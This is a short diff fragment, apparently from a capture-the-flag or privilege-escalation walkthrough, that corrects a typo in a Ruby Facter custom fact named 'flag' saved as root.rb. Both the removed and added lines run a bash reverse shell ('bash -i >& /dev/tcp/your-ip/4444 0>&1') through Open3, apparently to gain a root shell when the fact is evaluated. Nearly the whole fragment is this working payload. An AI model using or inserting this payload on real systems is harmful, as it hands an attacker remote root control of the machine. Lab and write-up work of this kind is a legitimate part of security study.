@@ -145,7 +145,7 @@ nano root.rb  ### add next code in it.
 Facter.add('flag') do
   setcode do
     require 'open3'
-    stdout, stderr, status = Open3.capture3('/bin/bash -c "bash -i >& /dev/tcp/yoour-ip/4444 0>&1"' )
+    stdout, stderr, status = Open3.capture3('/bin/bash -c "bash -i >& /dev/tcp/your-ip/4444 0>&1"' )
     stdout.strip
   end
 end
